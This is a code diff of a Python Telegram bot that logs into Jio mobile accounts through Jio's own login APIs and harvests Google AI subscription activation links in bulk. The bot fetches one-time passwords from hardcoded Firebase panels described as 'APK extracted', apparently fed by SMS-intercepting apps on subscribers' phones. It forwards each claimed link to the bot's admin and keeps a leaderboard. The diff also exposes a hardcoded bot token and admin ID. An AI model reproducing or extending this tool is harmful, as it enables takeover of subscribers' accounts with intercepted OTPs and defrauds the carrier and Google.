@@ -16,14 +16,18 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 BOT_TOKEN = "8232062513:AAFdRySb9fe2lmEm9r7rBWJ0QVyy0XNGqgQ"
 ADMIN_ID = "8139558808"
 BOT_USERNAME = "@papukhelu_bot"
-BASE_URL = "https://looters.shop/jio_gemini/"
+
+# Direct Jio API (no looters.shop)
+JIO_SEND_OTP_URL = "https://www.jio.com/api/jio-login-service/login/sendOtp"
+JIO_VERIFY_OTP_URL = "https://www.jio.com/api/jio-login-service/login/validateOtp"
+JIO_AUTH_URL = "https://www.jio.com/api/jio-authenticate-service/authenticate/authJsonData"
+JIO_NAVIGATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/navigate/Z0241"
+JIO_ACTIVATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/activate/Z0241?source=JIO"
+JIO_GOOGLE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/google-ai"
+JIO_SUBMIT_URL = "https://www.jio.com/api/jio-ott-service/ott/submission/submit"
+JIO_CHECK_URL = "https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{mobile}"
 
 TELEGRAM_PROXY = os.getenv("TELEGRAM_PROXY", "")
-HEADERS = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
-    "Origin": "https://looters.shop",
-    "Referer": "https://looters.shop/jio_gemini/",
-}
 
 # ==========================================
 # HARDCODED FIREBASE PANELS (APK extracted)
@@ -453,70 +457,146 @@ def check_link_status(url):
 # ==========================================
 def process_single_number(phone, chat_id, first_name, fb_url, device_id):
     print(f"\n{'='*50}")
-    print(f"🚀 Processing: {phone}")
+    print(f"Processing: {phone}")
     print(f"{'='*50}")
 
     used = load_used()
     if phone in used:
-        print(f"  ⚠️ Already used. Skipping.")
+        print(f"  Already used. Skipping.")
         return False
 
-    session = requests.Session()
+    # Create Jio session
+    jio = requests.Session()
+    jio.headers.update({
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Origin": "https://www.jio.com",
+        "Referer": "https://www.jio.com/selfcare/login/",
+    })
 
-    # 1. Send OTP
-    print(f"  [Step 1] Sending OTP...")
-    data = None
-    for attempt in range(3):
-        try:
-            res = session.post(BASE_URL, data={"action": "send_otp", "number": phone},
-                             headers=HEADERS, timeout=15)
-            data = res.json()
-            break
-        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-            if attempt < 2:
-                print(f"  [RETRY] ({attempt+1}/2)...")
-                time.sleep(2)
-                continue
-    if not data or not data.get("success"):
-        print(f"  ❌ OTP failed: {data}")
+    # 1. Send OTP via Direct Jio API
+    print(f"  [Step 1] Sending OTP via Jio API...")
+    try:
+        res = jio.post(JIO_SEND_OTP_URL,
+                       json={"mobileNumber": phone, "loginFlowType": "MOBILE", "alternateNumber": ""},
+                       timeout=20)
+        data = res.json()
+        if str(data.get("responseCode")) != "200" or data.get("responseMessage") != "SUCCESS":
+            print(f"  OTP send failed: {data}")
+            save_used(phone)
+            return False
+        print(f"  OTP Sent! Masked: {data.get('maskedValue', 'N/A')}")
+    except Exception as e:
+        print(f"  OTP send error: {e}")
         save_used(phone)
         return False
-    print(f"  ✅ OTP Sent!")
 
-    # 2. Get last message key
+    # 2. Get last message key from Firebase
     last_key = get_last_message_key(fb_url, device_id)
 
     # 3. Poll OTP from Firebase
+    print(f"  [Step 2] Waiting for OTP from Firebase...")
     otp = poll_otp(fb_url, device_id, last_key, timeout=30)
     if not otp:
-        print(f"  ❌ No OTP received")
+        print(f"  No OTP received")
         save_used(phone)
         return False
 
-    # 4. Verify OTP
-    print(f"  [Step 2] Verifying OTP...")
-    v_data = None
-    for attempt in range(3):
+    # 4. Verify OTP via Direct Jio API
+    print(f"  [Step 3] Verifying OTP...")
+    try:
+        res = jio.post(JIO_VERIFY_OTP_URL,
+                       json={"mobileNumber": phone, "otp": otp},
+                       timeout=20)
+        v_data = res.json()
+        if str(v_data.get("responseCode")) != "200":
+            print(f"  Verify failed: {v_data}")
+            save_used(phone)
+            return False
+        print(f"  OTP Verified!")
+    except Exception as e:
+        print(f"  Verify error: {e}")
+        save_used(phone)
+        return False
+
+    # 5. Get Activation Link
+    print(f"  [Step 4] Getting activation link...")
+    try:
+        # Check auth
+        auth_resp = jio.get(JIO_AUTH_URL, headers={"Referer": "https://www.jio.com/selfcare/dashboard/"}, timeout=20)
+        auth_data = auth_resp.json()
+        if str(auth_data.get("loginFlag", "")).lower() != "true":
+            print(f"  Auth failed: {auth_data}")
+            save_used(phone)
+            return False
+
+        # Navigate
+        jio.get(JIO_NAVIGATE_URL, headers={"Referer": "https://www.jio.com/selfcare/dashboard/"}, timeout=20)
+
+        # Activate
+        act_resp = jio.get(JIO_ACTIVATE_URL, headers={"Referer": "https://www.jio.com/selfcare/googleai/"}, timeout=20)
+        act_data = act_resp.json()
+        act_msg = str(act_data.get("errorMessage", "") or act_data.get("responseMessage", "")).lower()
+        if "already" in act_msg:
+            print(f"  Already active: {act_msg}")
+            save_used(phone)
+            return False
+        if str(act_data.get("errorCode", "200")) != "200":
+            print(f"  Activate failed: {act_data}")
+            save_used(phone)
+            return False
+
+        # Get Google URL
+        google_resp = jio.get(JIO_GOOGLE_URL, headers={"Referer": "https://www.jio.com/selfcare/googleai/"}, timeout=20)
+        google_data = google_resp.json()
+        google_msg = str(google_data.get("errorMessage", "") or google_data.get("responseMessage", "")).lower()
+        if "already" in google_msg:
+            print(f"  Already claimed: {google_msg}")
+            save_used(phone)
+            return False
+
+        # Extract link
+        redirect_url = str(google_data.get("redirectionURL", ""))
+        link = ""
+        import html as html_mod
+        from urllib.parse import unquote
+        text = html_mod.unescape(redirect_url)
+        for _ in range(4):
+            decoded = unquote(text)
+            if decoded == text:
+                break
+            text = decoded
+        act_match = re.search(
+            r"https?://serviceactivation[.]google[.]com/subscription/new/"
+            r"([A-Za-z0-9_-]{50,})(={0,2})",
+            text, re.IGNORECASE
+        )
+        if act_match:
+            link = "https://serviceactivation.google.com/subscription/new/" + act_match.group(1) + act_match.group(2)
+
+        if not link:
+            print(f"  No activation link found")
+            save_used(phone)
+            return False
+
+        # Submit
         try:
-            res = session.post(BASE_URL, data={"action": "verify_otp", "number": phone, "otp": otp},
-                             headers=HEADERS, timeout=30)
-            v_data = res.json()
-            break
-        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-            if attempt < 2:
-                print(f"  [RETRY] ({attempt+1}/2)...")
-                time.sleep(3)
-                continue
-    if not v_data or not v_data.get("success"):
-        print(f"  ❌ Verify failed: {v_data}")
+            jio.get(JIO_SUBMIT_URL, headers={"Referer": "https://www.jio.com/selfcare/googleai/"}, timeout=20)
+        except Exception:
+            pass
+
+        print(f"  LINK FOUND: {link}")
+
+    except Exception as e:
+        print(f"  Activation error: {e}")
         save_used(phone)
         return False
 
-    link = v_data.get("link", "No link")
+    # 6. Check link status
     status = check_link_status(link)
-    print(f"  🎉 LINK: {status} | {link}")
 
-    # 5. Save
+    # 7. Save
     save_used(phone)
 
     time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -536,19 +616,19 @@ def process_single_number(phone, chat_id, first_name, fb_url, device_id):
         leaderboard_data[user_id_str]["count"] += 1
         save_leaderboard()
 
-    # 6. Send to Telegram
+    # 8. Send to Telegram
     markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("🔗 Open Link", url=link))
+    markup.add(InlineKeyboardButton("Open Link", url=link))
     bot.send_message(chat_id,
-        f"🎉 <b>LINK FOUND!</b>\n\n"
-        f"📱 <code>{phone}</code>\n"
-        f"📊 {status}\n"
-        f"🔗 <code>{link}</code>",
+        f"LINK FOUND!\n\n"
+        f"Phone: <code>{phone}</code>\n"
+        f"Status: {status}\n"
+        f"Link: <code>{link}</code>",
         reply_markup=markup)
 
     try:
         bot.send_message(ADMIN_ID,
-            f"👑 <b>New Link!</b> {first_name} | <code>{phone}</code> | {status}\n<code>{link}</code>")
+            f"New Link! {first_name} | <code>{phone}</code> | {status}\n<code>{link}</code>")
     except Exception:
         pass
 
@@ -862,50 +942,95 @@ def process_number_step(message):
 
 def async_send_otp(chat_id, number, first_name):
     try:
-        session = requests.Session()
-        res = session.post(BASE_URL, data={"action": "send_otp", "number": number}, headers=HEADERS, timeout=10)
+        jio = requests.Session()
+        jio.headers.update({
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Origin": "https://www.jio.com",
+            "Referer": "https://www.jio.com/selfcare/login/",
+        })
+        res = jio.post(JIO_SEND_OTP_URL,
+                       json={"mobileNumber": number, "loginFlowType": "MOBILE", "alternateNumber": ""},
+                       timeout=20)
         data = res.json()
-        if data.get("success"):
-            msg = bot.send_message(chat_id, "✅ OTP Sent!\n\n👉 Enter OTP:")
+        if str(data.get("responseCode")) == "200" and data.get("responseMessage") == "SUCCESS":
+            msg = bot.send_message(chat_id, "OTP Sent! Enter OTP:")
             bot.register_next_step_handler(msg, process_otp_step, number, first_name)
         else:
-            bot.send_message(chat_id, f"❌ {data.get('message', 'Failed')}")
+            bot.send_message(chat_id, f"Failed: {data.get('responseMessage', 'Error')}")
     except Exception:
-        bot.send_message(chat_id, "⚠️ Server slow! /start")
+        bot.send_message(chat_id, "Server slow! /start")
 
 def process_otp_step(message, number, first_name):
     otp = message.text.strip() if message.text else ""
-    bot.send_message(message.chat.id, "⏳ Verifying...")
+    bot.send_message(message.chat.id, "Verifying...")
     threading.Thread(target=async_verify_otp,
                      args=(message.chat.id, number, otp, first_name), daemon=True).start()
 
 def async_verify_otp(chat_id, number, otp, first_name):
     try:
-        session = requests.Session()
-        res = session.post(BASE_URL, data={"action": "verify_otp", "number": number, "otp": otp},
-                         headers=HEADERS, timeout=12)
+        jio = requests.Session()
+        jio.headers.update({
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Origin": "https://www.jio.com",
+            "Referer": "https://www.jio.com/selfcare/login/",
+        })
+        res = jio.post(JIO_VERIFY_OTP_URL,
+                       json={"mobileNumber": number, "otp": otp},
+                       timeout=20)
         data = res.json()
-        if data.get("success"):
-            link = data.get("link", "No link")
-            status = check_link_status(link)
-            save_used(number)
-            markup = InlineKeyboardMarkup()
-            markup.add(InlineKeyboardButton("🔗 Open Link", url=link))
-            markup.add(InlineKeyboardButton("🚀 Generate More", callback_data="start_generate"))
-            bot.send_message(chat_id,
-                f"🎉 <b>DONE!</b>\n\n{status}\n<code>{link}</code>", reply_markup=markup)
-            user_id_str = str(chat_id)
-            with FILE_LOCK:
-                with open(LINKS_FILE, "a") as f:
-                    f.write(f"[{datetime.now():%Y-%m-%d %H:%M:%S}] {first_name} | {number} | {status} | {link}\n")
-                if user_id_str not in leaderboard_data:
-                    leaderboard_data[user_id_str] = {"name": first_name, "count": 0}
-                leaderboard_data[user_id_str]["count"] += 1
-                save_leaderboard()
+        if str(data.get("responseCode")) == "200":
+            # Get activation link
+            try:
+                jio.get(JIO_AUTH_URL, headers={"Referer": "https://www.jio.com/selfcare/dashboard/"}, timeout=20)
+                jio.get(JIO_NAVIGATE_URL, headers={"Referer": "https://www.jio.com/selfcare/dashboard/"}, timeout=20)
+                act_resp = jio.get(JIO_ACTIVATE_URL, headers={"Referer": "https://www.jio.com/selfcare/googleai/"}, timeout=20)
+                act_data = act_resp.json()
+                if str(act_data.get("errorCode", "200")) != "200":
+                    bot.send_message(chat_id, f"Activation failed: {act_data.get('errorMessage', 'Error')}")
+                    return
+                google_resp = jio.get(JIO_GOOGLE_URL, headers={"Referer": "https://www.jio.com/selfcare/googleai/"}, timeout=20)
+                google_data = google_resp.json()
+                redirect_url = str(google_data.get("redirectionURL", ""))
+                import html as html_mod
+                from urllib.parse import unquote
+                text = html_mod.unescape(redirect_url)
+                for _ in range(4):
+                    decoded = unquote(text)
+                    if decoded == text:
+                        break
+                    text = decoded
+                act_match = re.search(
+                    r"https?://serviceactivation[.]google[.]com/subscription/new/"
+                    r"([A-Za-z0-9_-]{50,})(={0,2})",
+                    text, re.IGNORECASE
+                )
+                if act_match:
+                    link = "https://serviceactivation.google.com/subscription/new/" + act_match.group(1) + act_match.group(2)
+                    status = check_link_status(link)
+                    save_used(number)
+                    markup = InlineKeyboardMarkup()
+                    markup.add(InlineKeyboardButton("Open Link", url=link))
+                    markup.add(InlineKeyboardButton("Generate More", callback_data="start_generate"))
+                    bot.send_message(chat_id,
+                        f"DONE!\n\n{status}\n<code>{link}</code>", reply_markup=markup)
+                    user_id_str = str(chat_id)
+                    with FILE_LOCK:
+                        with open(LINKS_FILE, "a") as f:
+                            f.write(f"[{datetime.now():%Y-%m-%d %H:%M:%S}] {first_name} | {number} | {status} | {link}\n")
+                        if user_id_str not in leaderboard_data:
+                            leaderboard_data[user_id_str] = {"name": first_name, "count": 0}
+                        leaderboard_data[user_id_str]["count"] += 1
+                        save_leaderboard()
+                else:
+                    bot.send_message(chat_id, "No activation link found")
+            except Exception as e:
+                bot.send_message(chat_id, f"Error: {e}")
         else:
-            bot.send_message(chat_id, f"❌ {data.get('message', 'Invalid OTP')}")
+            bot.send_message(chat_id, f"Invalid OTP: {data.get('responseMessage', 'Error')}")
     except Exception:
-        bot.send_message(chat_id, "⚠️ Timeout! /start")
+        bot.send_message(chat_id, "Timeout! /start")
 
 # ==========================================
 # HOURLY BACKUP
